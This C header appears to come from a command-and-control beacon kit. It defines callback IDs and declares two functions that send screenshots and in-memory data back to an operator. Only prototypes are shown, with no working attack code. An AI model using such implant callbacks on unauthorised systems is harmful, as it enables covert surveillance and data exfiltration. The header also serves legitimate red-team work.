#pragma once

#include "beacon.h"

#define CALLBACK_AX_SCREENSHOT   0x81
#define CALLBACK_AX_DOWNLOAD_MEM 0x82

void AxAddScreenshot(char* note, char* data, int len);

void AxDownloadMemory(char* filename, char* data, int len);